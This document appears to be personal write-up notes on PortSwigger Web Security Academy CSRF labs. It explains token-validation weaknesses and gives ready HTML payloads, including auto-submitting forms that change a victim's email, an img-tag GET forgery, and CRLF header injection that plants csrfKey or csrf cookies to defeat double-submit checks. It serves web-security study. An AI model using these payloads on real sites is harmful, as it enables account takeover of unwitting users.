# CSRF

- https://portswigger.net/web-security/csrf/bypassing-token-validation
- https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions
- https://portswigger.net/web-security/csrf/bypassing-referer-based-defenses
- https://portswigger.net/web-security/csrf#how-to-construct-a-csrf-attack
- https://tools.nakanosec.com/csrf/

## CSRF vulnerability with no defenses

Check email change request using burp and generate csrf form using https://tools.nakanosec.com/csrf/

Due to https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS#simple_requests:

```
Some requests don't trigger a CORS preflight. Those are called simple requests from the obsolete CORS spec, though the Fetch spec (which now defines CORS) doesn't use that term.

The motivation is that the <form> element from HTML 4.0 (which predates cross-site XMLHttpRequest and fetch) can submit simple requests to any origin, so anyone writing a server must already be protecting against cross-site request forgery (CSRF).
```

So it is prefered to use `<form>` because it "bypasses" `CORS`

```
<html>
	<body>
		<form method="POST" action="https://0a8200510435839080008f1a003a008d.web-security-academy.net/my-account/change-email">
			<input type="hidden" name="email" value="pwned@email.com"/>
			<input type="submit" value="Submit">
		</form>
        <script>
            document.forms[0].submit()
        </script>
	</body>
<html>
```

## CSRF where token validation depends on request method

Application allow changing email via GET request and does not validate CSRF tokens in GET requests.

Deliver to victim:
```
<img src="https://0afd00f40477303a87a067c200da00ec.web-security-academy.net/my-account/change-email?email=pwned%40email.com" alt="Cute-cats.png"/>
```
## CSRF where token validation depends on token being present

Application skip CSRF token check if there is no token present.

Create request changing email and generate PoC CSRF form:

```
<html>
	<body>
		<form method="POST" action="https://0a9f00220461d3ad80b049b6001d00c8.web-security-academy.net/my-account/change-email">
			<input type="hidden" name="email" value="pwned@email.com"/>
			<input type="submit" value="Submit">
		</form>
        <script>
            document.forms[0].submit()
        </script>
	</body>
<html>
```

## CSRF where token is not tied to user session

Perform GET request to a page with CSRF token as logged in user and copy its value. (here it is `A1tFmT23frESJoZoNOABO3sECg3JY4gM`)

After that CSRF for any other user can be performed using our token.

Deliver this to victim:

```
<html>
	<body>
		<form method="POST" action="https://0aa700cd040785e182702e4600470008.web-security-academy.net/my-account/change-email">
			<input type="hidden" name="email" value="pwned@email.com"/>
            <input type="hidden" name="csrf" value="A1tFmT23frESJoZoNOABO3sECg3JY4gM"/>
			<input type="submit" value="Submit">
		</form>
        <script>
            document.forms[0].submit()
        </script>
	</body>
<html>
```

## CSRF where token is tied to non-session cookie

CSRF tokens are separated from session, but tied to different cookie `csrfKey`. Only supplying valid `csrf token` generated for provided `csrfKey` will result in a success.

Accessing a page with a form we generate valid `csrf token` for our `csrfKey`.

Application contains cookie named `LastSearchTerm` which we can make us of in order to change `csrfKey` cookie of the victim. `LastSearchTerm` value is reflected to the response, so making a specific request will change `csrfKey` cookie.

Normal response
```
HTTP/2 200 OK
Set-Cookie: LastSearchTerm=A; Secure; HttpOnly
```

Our request with payload:
```
https://0a2800fb036089008326ec5000a5004e.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=UcLvcqDOpmMVcvGbc5g6oVRlR35scH1n%3b%20SameSite=None
```

Resulting response:
```
HTTP/2 200 OK
Set-Cookie: LastSearchTerm=test
Set-Cookie: csrfKey=UcLvcqDOpmMVcvGbc5g6oVRlR35scH1n; SameSite=None; Secure; HttpOnly
```

Deliver this payload with our pre-created `csrf` value generated with provided `csrfKey` cookie to the victim to change their email:
```
<html>
	<body>
        <!-- Perform changin csrfKey GET request -->
        <img src="https://0a2800fb036089008326ec5000a5004e.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=UcLvcqDOpmMVcvGbc5g6oVRlR35scH1n%3b%20SameSite=None" alt="Redirecting..."/>  
		
        <form method="POST" action="https://0a2800fb036089008326ec5000a5004e.web-security-academy.net/my-account/change-email">
			<input type="hidden" name="email" value="pwned@email.com"/>
            <input type="hidden" name="csrf" value="5w3aESh30qnR4UNhe3EEcLsDfvRSdl8s"/>
		</form>
        <script>
            <!-- Wait until csrfKey is changed and make a POST request changing email -->
            window.addEventListener("load", ()=>{
                document.forms[0].submit()
            })
        </script>
	</body>
<html>
```

Other interesting proposition from solution to replace listening for load event:
```
<img src="https://YOUR-LAB-ID.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None" onerror="document.forms[0].submit();"/>
```

## CSRF where token is duplicated in cookie

Similarly to previous lab we can set the cookie for the user making a get request:
```
https://0a6d00910467fbba83795ae0001e0069.web-security-academy.net/?search=A%0d%0aSet-Cookie:+csrf=CustomCSRFToken;%20SameSite=None
```

Now as we know the value of `csrf` cookie (because we set it), we can bypass `double submit` csrf protection and make a request with our `CustomCSRFToken` in the body (as the cookie with the same value will be sent along).

Sent this payload to the victim:
```
<html>
	<body>
        <!-- Perform changing csrf cookie GET request -->
        <img src="https://0a6d00910467fbba83795ae0001e0069.web-security-academy.net/?search=A%0d%0aSet-Cookie:+csrf=CustomCSRFToken;%20SameSite=None" alt="Redirecting...">

		<form method="POST" action="https://0a6d00910467fbba83795ae0001e0069.web-security-academy.net/my-account/change-email">
			<input type="hidden" name="email" value="pwned@email.com"/>
			<input type="hidden" name="csrf" value="CustomCSRFToken"/>
		</form>

        <script>
            <!-- Wait until csrf cookie is changed and make a POST request changing email -->
            window.addEventListener("load", ()=>{
                document.forms[0].submit()
            })
        </script>
	</body>
<html>
```

Other interesting proposition from solution to replace listening for load event:
```
<img src="https://YOUR-LAB-ID.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None" onerror="document.forms[0].submit();"/>
```

